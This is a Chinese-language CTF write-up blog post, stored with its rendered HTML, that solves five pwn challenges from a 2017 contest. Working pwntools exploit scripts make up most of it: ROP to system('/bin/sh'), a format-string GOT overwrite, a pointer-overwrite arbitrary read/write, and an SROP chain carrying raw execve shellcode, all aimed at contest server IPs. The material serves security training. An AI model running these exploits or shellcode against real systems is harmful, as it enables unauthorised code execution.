ELF('./pwn1')\nsystem_plt = elf.symbols['system']\nscanf_addr = elf.symbols['__isoc99_scanf']\nbss = elf.bss\nmain = 0x08048531\nppr = 0x080485ee\n\n\noffset = 52\n\ndef pwn():\n    payload = cyclic(offset) + p32(scanf_addr) + p32(main) + p32(0x08049629) + p32(0x0804A028)\n    payload1 = cyclic(44) + p32(system_plt) + p32(1234) + p32(0x0804a028)\n    p.recvuntil('test')\n#    gdb.attach(p)\n    p.sendline(payload)\n    p.sendline('/bin/sh')\n    p.sendline(payload1)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## pwn2\n\n格式化字符串漏洞。先泄露`__libc_start_main+246`的地址，然后将`printf`的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用\n`readelf -a libc-2.12 | grep __libc_start_main`和`readelf -a libc-2.12 | grep system`\n得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwn2')\n    libc = ELF('/lib32/libc.so.6')\nelse:\n    p = remote('106.75.93.221',20002)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./pwn2')\nprintf_got = elf.got['printf']\n\ndef leak(payload):\n    p = process('./pwn2')\n    p.sendline(payload)\n    return p.recvall(0.1)\n\ndef pwn():\n# 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main\n# 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system\n    payload = '%267$x'\n    p.sendline(payload)\n    leak_addr = int(p.recv(8), 16)\n    print '__libc_start_main => ', hex(leak_addr)\n    libc_address = leak_addr - 0x0016c30 - 246\n    print 'libc_address => ', hex(libc_address)\n\n#    fmt = FmtStr(leak)\n#    print 'offset => ', fmt.offset\n\n    system_addr = libc_address + 0x0003ae80\n    write = {printf_got:system_addr}\n    payload = fmtstr_payload(7, write, 0, 'byte')\n#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')\n    p.sendline(payload)\n    p.sendline('/bin/sh\\x00')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## pwn3\n\nlogo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。\n\n将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\nglobal libc\n\nif slog: context(log_level = 'debug')\ndef makeio():\n    if local:\n        p = process('./pwn3')\n        libc = ELF('/lib32/libc.so.6')\n    else:\n        p = remote('106.75.93.221',10002)\n        libc = ELF('/lib32/libc.so.6')\n    return p, libc\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./pwn3')\nprintf_got = elf.got['printf']\natoi_got = elf.got['atoi']\nfgets_got = elf.got['fgets']\nstdout = 0x0804A060\n\ndef upid(payload):\n    p.recvuntil('=>')\n    p.sendline('1')\n    p.recvuntil('ID.')\n    payload = '123456781234'+payload\n    p.sendline(payload.ljust(0x15, '1'))\n\ndef printname():\n    p.recvuntil('=>')\n    p.sendline('4')\n    p.recvuntil('name:')\n    p.recv(1)\n\ndef printlogo():\n    p.recvuntil('=>')\n#    gdb.attach(p)\n    p.sendline('5')\n\ndef upmem(num):\n    p.recvuntil('=>')\n    p.sendline('2')\n    p.sendline(str(num))\n\ndef upname(payload):\n    p.recvuntil('=>')\n    p.sendline('3')\n    p.send(payload)\n\ndef leak(address):\n    upid(p32(address))\n    printname()\n    data = p.recv(4)\n    log.info(\"%#x => %s\" % (address, data))\n    return data\n\ndef pwn(p):\n    p.recvuntil('id')\n    p.send('12345678')\n    printlogo()\n\n#    d = DynELF(leak, elf=ELF('./pwn3'))\n#    system_addr = d.lookup('system', 'libc')\n#    print system_addr\n\n    upid(p32(atoi_got))\n    printname()\n    atoi_addr = u32(p.recv(4)) - 0xa000000\n    print hex(atoi_addr)\n\n    \n    upid(p32(fgets_got))\n#    gdb.attach(p)\n    printname()\n    print hex(u32(p.recv(4)))\n    print 'atoi_addr => ', hex(atoi_addr) \n\n#    libc.address = atoi_addr - libc.symbols['atoi']\n#    print 'libc.address => ', hex(libc.address)\n#    system_addr = libc.symbols['system']\n#    print 'dis libc => ', hex(atoi_addr - libc.address)\n\n#    print 'distance', hex(system_addr - atoi_addr)\n    \n    system_addr = atoi_addr + 0xf030\n    print 'system => ', hex(system_addr)\n    upmem(5)\n    upname(p32(system_addr))\n#    gdb.attach(p)\n    p.recvuntil('=>')\n    p.sendline('/bin/sh\\x00')\n\nif __name__ == '__main__':\n    p,libc = makeio()\n    pwn(p)\n    p.interactive()\n```\n\n## pwn4\n\n360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。\n当初写的脚本找不到了，网上找了一个。\n\n```\n# -*-coding:utf-8-*-\n__author__ = 'joker'\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\n#r = process(\"./pwn4\")\nr = remote('106.75.66.195', 11006)\nsyscall_addr = 0x4000BE\nstart_addr = 0x4000B0\npayload = p64(start_addr)\npayload += p64(start_addr)#fill\npayload += p64(start_addr)#fill\nr.send(payload)\n#write infor leak\nr.send(\"\\xb3\")#write 2 start_addr last byte\ndata = r.recv(8)\ndata = r.recv(8)\nstack_addr = u64(data) - 0xa00\nprint \"[*]:stack:{0}\".format(hex(stack_addr))\nframe = SigreturnFrame()\nframe.rax = constants.SYS_read\nframe.rdi = 0\nframe.rsi = stack_addr\nframe.rdx = 0x300\nframe.rsp = stack_addr\nframe.rip = syscall_addr\npayload = p64(start_addr)\npayload += p64(syscall_addr)\npayload += str(frame)\nr.send(payload)\npayload = p64(0x4000B3)#fill\npayload += p64(0x4000B3)#fill\npayload = payload[:15]\nr.send(payload)#set rax=sys_rt_sigreturn\nframe = SigreturnFrame()\nframe.rax = constants.SYS_mprotect\nframe.rdi = (stack_addr&0xfffffffffffff000)\nframe.rsi = 0x1000\nframe.rdx = 0x7\nframe.rsp = stack_addr + 0x108\nframe.rip = syscall_addr\npayload = p64(start_addr)\npayload += p64(syscall_addr)\npayload += str(frame)\npayload += p64(stack_addr + 0x108 + 8)\n#payload += cyclic(0x100)#addr ====> start_addr + 0x108\npayload += \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"#shellcode\nr.send(payload)\npayload = p64(0x4000B3)#fill\npayload += p64(0x4000B3)#fill\npayload = payload[:15]\nr.send(payload)#set rax=sys_rt_sigreturn\nr.interactive()\n```\n\n## pwn5\n\n老套路了。。将环境变量中文件名的指针覆盖为flag的地址，`__stack_chk_fail`时候输出即可。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwnsss')\nelse:\n    p = remote('106.75.93.221', 10003)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\ndef pwn():\n    p.recvuntil('something\\n')\n    payload = p32(0x0804a080) * 300\n    p.sendline(payload)\n    print p.recvline()\n\nif __name__ == '__main__':\n    pwn()\n```","source":"_posts/2017广东红帽pwn.md","raw":"---\ntitle: 2017广东红帽pwn\ntags:\n  - PWN\ncategories: []\ndate: 2017-05-09 22:13:59\n---\n\n第一次ak，记录下。不过主要因为题目很简单。\n<!--more-->\n\n## pwn1\n\n栈溢出，`system`已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwn1')\nelse:\n    p = remote('106.75.93.221',10000)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./pwn1')\nsystem_plt = elf.symbols['system']\nscanf_addr = elf.symbols['__isoc99_scanf']\nbss = elf.bss\nmain = 0x08048531\nppr = 0x080485ee\n\n\noffset = 52\n\ndef pwn():\n    payload = cyclic(offset) + p32(scanf_addr) + p32(main) + p32(0x08049629) + p32(0x0804A028)\n    payload1 = cyclic(44) + p32(system_plt) + p32(1234) + p32(0x0804a028)\n    p.recvuntil('test')\n#    gdb.attach(p)\n    p.sendline(payload)\n    p.sendline('/bin/sh')\n    p.sendline(payload1)\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## pwn2\n\n格式化字符串漏洞。先泄露`__libc_start_main+246`的地址，然后将`printf`的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用\n`readelf -a libc-2.12 | grep __libc_start_main`和`readelf -a libc-2.12 | grep system`\n得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 1\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwn2')\n    libc = ELF('/lib32/libc.so.6')\nelse:\n    p = remote('106.75.93.221',20002)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./pwn2')\nprintf_got = elf.got['printf']\n\ndef leak(payload):\n    p = process('./pwn2')\n    p.sendline(payload)\n    return p.recvall(0.1)\n\ndef pwn():\n# 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main\n# 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system\n    payload = '%267$x'\n    p.sendline(payload)\n    leak_addr = int(p.recv(8), 16)\n    print '__libc_start_main => ', hex(leak_addr)\n    libc_address = leak_addr - 0x0016c30 - 246\n    print 'libc_address => ', hex(libc_address)\n\n#    fmt = FmtStr(leak)\n#    print 'offset => ', fmt.offset\n\n    system_addr = libc_address + 0x0003ae80\n    write = {printf_got:system_addr}\n    payload = fmtstr_payload(7, write, 0, 'byte')\n#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')\n    p.sendline(payload)\n    p.sendline('/bin/sh\\x00')\n\nif __name__ == '__main__':\n    pwn()\n    p.interactive()\n```\n\n## pwn3\n\nlogo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。\n\n将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\nglobal libc\n\nif slog: context(log_level = 'debug')\ndef makeio():\n    if local:\n        p = process('./pwn3')\n        libc = ELF('/lib32/libc.so.6')\n    else:\n        p = remote('106.75.93.221',10002)\n        libc = ELF('/lib32/libc.so.6')\n    return p, libc\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\nelf = ELF('./pwn3')\nprintf_got = elf.got['printf']\natoi_got = elf.got['atoi']\nfgets_got = elf.got['fgets']\nstdout = 0x0804A060\n\ndef upid(payload):\n    p.recvuntil('=>')\n    p.sendline('1')\n    p.recvuntil('ID.')\n    payload = '123456781234'+payload\n    p.sendline(payload.ljust(0x15, '1'))\n\ndef printname():\n    p.recvuntil('=>')\n    p.sendline('4')\n    p.recvuntil('name:')\n    p.recv(1)\n\ndef printlogo():\n    p.recvuntil('=>')\n#    gdb.attach(p)\n    p.sendline('5')\n\ndef upmem(num):\n    p.recvuntil('=>')\n    p.sendline('2')\n    p.sendline(str(num))\n\ndef upname(payload):\n    p.recvuntil('=>')\n    p.sendline('3')\n    p.send(payload)\n\ndef leak(address):\n    upid(p32(address))\n    printname()\n    data = p.recv(4)\n    log.info(\"%#x => %s\" % (address, data))\n    return data\n\ndef pwn(p):\n    p.recvuntil('id')\n    p.send('12345678')\n    printlogo()\n\n#    d = DynELF(leak, elf=ELF('./pwn3'))\n#    system_addr = d.lookup('system', 'libc')\n#    print system_addr\n\n    upid(p32(atoi_got))\n    printname()\n    atoi_addr = u32(p.recv(4)) - 0xa000000\n    print hex(atoi_addr)\n\n    \n    upid(p32(fgets_got))\n#    gdb.attach(p)\n    printname()\n    print hex(u32(p.recv(4)))\n    print 'atoi_addr => ', hex(atoi_addr) \n\n#    libc.address = atoi_addr - libc.symbols['atoi']\n#    print 'libc.address => ', hex(libc.address)\n#    system_addr = libc.symbols['system']\n#    print 'dis libc => ', hex(atoi_addr - libc.address)\n\n#    print 'distance', hex(system_addr - atoi_addr)\n    \n    system_addr = atoi_addr + 0xf030\n    print 'system => ', hex(system_addr)\n    upmem(5)\n    upname(p32(system_addr))\n#    gdb.attach(p)\n    p.recvuntil('=>')\n    p.sendline('/bin/sh\\x00')\n\nif __name__ == '__main__':\n    p,libc = makeio()\n    pwn(p)\n    p.interactive()\n```\n\n## pwn4\n\n360春秋杯，原题，SROP不说了。。。因为是centos，还要爆破下偏移，感谢小伙伴@Inj3ct0r的偏移计算。\n当初写的脚本找不到了，网上找了一个。\n\n```\n# -*-coding:utf-8-*-\n__author__ = 'joker'\nfrom pwn import *\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\n#r = process(\"./pwn4\")\nr = remote('106.75.66.195', 11006)\nsyscall_addr = 0x4000BE\nstart_addr = 0x4000B0\npayload = p64(start_addr)\npayload += p64(start_addr)#fill\npayload += p64(start_addr)#fill\nr.send(payload)\n#write infor leak\nr.send(\"\\xb3\")#write 2 start_addr last byte\ndata = r.recv(8)\ndata = r.recv(8)\nstack_addr = u64(data) - 0xa00\nprint \"[*]:stack:{0}\".format(hex(stack_addr))\nframe = SigreturnFrame()\nframe.rax = constants.SYS_read\nframe.rdi = 0\nframe.rsi = stack_addr\nframe.rdx = 0x300\nframe.rsp = stack_addr\nframe.rip = syscall_addr\npayload = p64(start_addr)\npayload += p64(syscall_addr)\npayload += str(frame)\nr.send(payload)\npayload = p64(0x4000B3)#fill\npayload += p64(0x4000B3)#fill\npayload = payload[:15]\nr.send(payload)#set rax=sys_rt_sigreturn\nframe = SigreturnFrame()\nframe.rax = constants.SYS_mprotect\nframe.rdi = (stack_addr&0xfffffffffffff000)\nframe.rsi = 0x1000\nframe.rdx = 0x7\nframe.rsp = stack_addr + 0x108\nframe.rip = syscall_addr\npayload = p64(start_addr)\npayload += p64(syscall_addr)\npayload += str(frame)\npayload += p64(stack_addr + 0x108 + 8)\n#payload += cyclic(0x100)#addr ====> start_addr + 0x108\npayload += \"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"#shellcode\nr.send(payload)\npayload = p64(0x4000B3)#fill\npayload += p64(0x4000B3)#fill\npayload = payload[:15]\nr.send(payload)#set rax=sys_rt_sigreturn\nr.interactive()\n```\n\n## pwn5\n\n老套路了。。将环境变量中文件名的指针覆盖为flag的地址，`__stack_chk_fail`时候输出即可。\n\n```\n#!/usr/bin/env python\n# coding=utf-8\nfrom pwn import *\n\nslog = 0\nlocal = 0\ndebug = 0\n\nglobal p\n\nif slog: context(log_level = 'debug')\nif local:\n    p = process('./pwnsss')\nelse:\n    p = remote('106.75.93.221', 10003)\n\nif local and debug:\n    gdb.attach(p, open('debug'))\n\ndef pwn():\n    p.recvuntil('something\\n')\n    payload = p32(0x0804a080) * 300\n    p.sendline(payload)\n    print p.recvline()\n\nif __name__ == '__main__':\n    pwn()\n```","slug":"2017广东红帽pwn","published":1,"updated":"2017-05-14T12:46:14.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jxq000lhv18mm2l0l0n","content":"<p>第一次ak，记录下。不过主要因为题目很简单。<br><a id=\"more\"></a></p>\n<h2 id=\"pwn1\"><a href=\"#pwn1\" class=\"headerlink\" title=\"pwn1\"></a>pwn1</h2><p>栈溢出，<code>system</code>已经有了，用rop在.rodata段上写/bin/sh，然后调用system即可。</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./pwn1'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">10000</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn1'</span>)</div><div class=\"line\">system_plt = elf.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">scanf_addr = elf.symbols[<span class=\"string\">'__isoc99_scanf'</span>]</div><div class=\"line\">bss = elf.bss</div><div class=\"line\">main = <span class=\"number\">0x08048531</span></div><div class=\"line\">ppr = <span class=\"number\">0x080485ee</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">52</span></div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    payload = cyclic(<span class=\"built_in\">offset</span>) + p32(scanf_addr) + p32(main) + p32(<span class=\"number\">0x08049629</span>) + p32(<span class=\"number\">0x0804A028</span>)</div><div class=\"line\">    payload1 = cyclic(<span class=\"number\">44</span>) + p32(system_plt) + p32(<span class=\"number\">1234</span>) + p32(<span class=\"number\">0x0804a028</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'test'</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn2\"><a href=\"#pwn2\" class=\"headerlink\" title=\"pwn2\"></a>pwn2</h2><p>格式化字符串漏洞。先泄露<code>__libc_start_main+246</code>的地址，然后将<code>printf</code>的got改成system。问题是我们没有libc。libc的信息是第一题的shell中得到的，用<br><code>readelf -a libc-2.12 | grep __libc_start_main</code>和<code>readelf -a libc-2.12 | grep system</code><br>得到libc中函数的偏移再计算即可。其中要注意libc的页对齐。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\">from pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"keyword\">local</span> = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">global p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span>:</div><div class=\"line\">    p = process(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">    libc = ELF(<span class=\"string\">'/lib32/libc.so.6'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote(<span class=\"string\">'106.75.93.221'</span>,<span class=\"number\">20002</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"keyword\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</div><div class=\"line\"></div><div class=\"line\">def leak(payload):</div><div class=\"line\">    p = process(<span class=\"string\">'./pwn2'</span>)</div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    <span class=\"keyword\">return</span> p.recvall(<span class=\"number\">0</span>.<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"><span class=\"comment\"># 7611: 00016c40   437 FUNC    GLOBAL DEFAULT   12 __libc_start_main</span></div><div class=\"line\"><span class=\"comment\"># 6733: 0003ae80   125 FUNC    WEAK   DEFAULT   12 system</span></div><div class=\"line\">    payload = <span class=\"string\">'%267$x'</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    leak_addr = <span class=\"keyword\">int</span>(p.recv(<span class=\"number\">8</span>), <span class=\"number\">16</span>)</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'__libc_start_main =&gt; '</span>, <span class=\"keyword\">hex</span>(leak_addr)</div><div class=\"line\">    libc_address = leak_addr - <span class=\"number\">0x0016c30</span> - <span class=\"number\">246</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'libc_address =&gt; '</span>, <span class=\"keyword\">hex</span>(libc_address)</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#    fmt = FmtStr(leak)</span></div><div class=\"line\"><span class=\"comment\">#    print 'offset =&gt; ', fmt.offset</span></div><div class=\"line\"></div><div class=\"line\">    system_addr = libc_address + <span class=\"number\">0x0003ae80</span></div><div class=\"line\">    <span class=\"keyword\">write</span> = &#123;printf_got:system_addr&#125;</div><div class=\"line\">    payload = fmtstr_payload(<span class=\"number\">7</span>, <span class=\"keyword\">write</span>, <span class=\"number\">0</span>, <span class=\"string\">'byte'</span>)</div><div class=\"line\"><span class=\"comment\">#    payload = fmtstr_payload(fmt.offset, write, 0, 'byte')</span></div><div class=\"line\">    p.sendline(payload)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh\\x00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name_<span class=\"number\">_</span> == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h2><p>logo函数中会把ebp-0x1c的位置填充为0xdadadada，这样当我们一开始输入id长度为8时最后的\\x00就会被覆盖，这样在update id的时候strlen函数就会把0xdadadada以及下面的name的堆指针给计算进去，我们修改id的时候就能修改到name指针。这样我们就存在了任意地址读和写。</p>\n<p>将name指针改为atoi_got，print name得到libc地址，将其修改为system地址传入/bin/sh即可。同样的，偏移在pwn1的shell中得到。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">0</span></div><div class=\"line\">local = <span class=\"number\">0</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">global</span> p</div><div class=\"line\"><span class=\"keyword\">global</span> libc</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">makeio</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    <span 